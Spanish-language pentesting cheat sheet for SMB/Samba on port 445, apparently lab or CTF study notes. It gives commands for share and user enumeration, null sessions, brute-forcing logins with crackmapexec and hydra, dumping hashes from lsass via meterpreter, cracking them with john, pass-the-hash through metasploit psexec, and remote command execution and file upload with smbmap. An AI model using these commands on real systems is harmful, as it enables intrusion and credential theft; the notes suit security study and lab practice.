# SMB/SAMBA (445)

Propietario: Adrian Gisbert Cabello

Scripts de NMAP para el puerto 445 (SMB):

- Ver los protocolos:	`nmap -p445 --script smb-protocols 192.168.X.X`
- Ver posibles credenciales:	`nmap -p445 --script smb-security-mode 192.168.X.X`
- Ver directorios: `nmap -p445 --script smb-enum-shares 192.168.X.X`
- Ver usuarios: `nmap -p445 --script smb-enum-users 192.168.X.X`
- Ver sesiones: `nmap -p445 --script smb-enum-sessions 192.168.X.X`
- `nmap -p445 --script smb-enum-shares --script-args smbusername=admninistrator,smbpassword=smbserver_771 192.168.X.X`

Para enumerar directorios y navegar a través de ellos podemos usar ***smbclient***:

- Entrar como usuario anónimo: `smbclient //192.168.X.X/anonymous`
- Ver directorios: `smbclient -N -L 192.168.X.X` | `crackmapexec smb 10.0.2.4 -u bogo -p bogo --shares`
- Para entrar en un directorio: `smbclient //192.168.X.X/nombre_directorio`s i nos pide contraseña podemos dejarla en blanco (si previamente hemos visto un usuario guest) )y si no la acepta hay que meter la credencial
- Para entrar en un directorio con un usuario: `smbclient //10.0.2.6/helios -U helios`

También podemos usar ***rpcclient***:

- Entrar mediante rpcclient: `rpcclient -U ¨¨ 192.168.X.X` Si no ponemos ningún nombre de usuario entre las comillas nos autentificaremos de manera anónima, dejando la contraseña en blanco.
- Entrar mediante rpcclient con una null session: `rpcclient -U “” 192.168.X.X -N`
- Ayuda: `help`
- Información del sistema: `srvinfo`
- Enumerar grupos: `enumdomgroups`
- Enumerar usuarios: `enumdomusers`
- Enumerar dominios: `enumdomains`
- Saber cuántos usuarios hay: `querydominfo`
- Enumerar redes: `netshareenumall`
- Saber el SID de un usuario: `lookupnames <nombre de usuario>`

Para entrar mediante fuerza bruta podemos usar crackmapexec:

- `crackmapexec smb 10.0.2.4 -u credentials.txt -p credentials.txt --continue-on-success`

La mejor manera para logearse por SMB es usando la herramienta ***psexec***, podemos hacerlo a través de terminal o a través de metasploit:

- A través de terminal: Localizamos la ruta del archivo [***psexec.py***](http://psexec.py) con el comando ***locate*** → `locate psexec.py` → una vez encontrado lo ejecutamos `/usr/share/doc/python3-impacket/examples/psexec.py (A/a)dministrator@192.168.X.X` Donde el administrator, podemos poner cualquier usuario → ponemos la contraseña
- A través de metasploit: Ejecutamos metasploit y buscamos: `search psexec type:exploit` → con el `show options` rellenamos los parámetros que nos pida el exploit
- Si estamos logeados a través de metasploit en una máquina windows, podemos usar el comando `hashdump`, si no funciona tenemos que migrar un proceso → `pgrep lsass` → `migrate 464` → `hashdump` → Copiamos el hash entero

- Para crackear el hash lo guardamos en un archivo ***hash.txt*** (por ejemplo), y mediante la herramienta ***john*** ponemos el siguiente comando: `john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` ******(el formato, hay que poner el que tenga el hash)

También podemos usar ***enum4linux*** para TODA la información: `enum4linux -a 192.168.X.X` | `enum4linux 192.168.X.X`

- Para enumerar información autenticándose con un usuario: `enum4linux -a -u admin -p password 192.168.X.X`

Podemos ver que acciones puede hacer un usuario con privilegios root con ***smbmap***:		`smbmap -H 192.168.X.X -u ¨¨ -p ¨¨` (si no sabemos usuarios y contraseñas lo dejamos vacío)

- Para hacer un RCE con smbmap: `smbmap -H 192.168.X.X -u USUARIO -p CONTRASEÑA -x ‘COMANDO’` (por ejemplo ipconfig)
- Para descargar un archivo con smbmap: `smbmap -H IP -u USR -p PASS --download 'C$**\**flag.txt'`
- Para subir un archivo con smbmap: `smbmap -H IP -u USR -p PASS --upload '/home/kali/pwned.php' 'C$**\**pwned.php'`

Para hacer un ataque de fuerza bruta con ***hydra***: `hydra -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.X.X smb`

Para hacer un ataque de fuerza bruta con ***metasploit***: `msfconsole` → `search smb_login`

Para conectarnos mediante una sesión meterpreter con la técnica Pass-The-Hash Attack, y así pivotar a otro usuario sin tener credenciales en texto plano pero si en formato hash, abrimos metasploit y buscamos `search psexec`, y usamos el módulo `use exploit/windows/smb/psexec`

`set SMBUser Administrator`

`set SMBPass aadjrkv3fgdsjjkdbk584gd:e3cf5g89rtdsdfg5t5h5` (Password HASH)

`set target Command` (Para ver todos los targets `set target`) podemos usar `set target Native \upload`

Para subir un payload:

- Si queremos conectarnos a través de crackmapexec con el password hash: `crackmapexec smb 192.168.X.X -u Administrator -H ¨HASH¨`
- Podemos ejecutar comandos con el parámetro -x: `crackmapexec smb 192.168.X.X -u Administrator -H ¨HASH¨` `-x ¨ipconfig¨`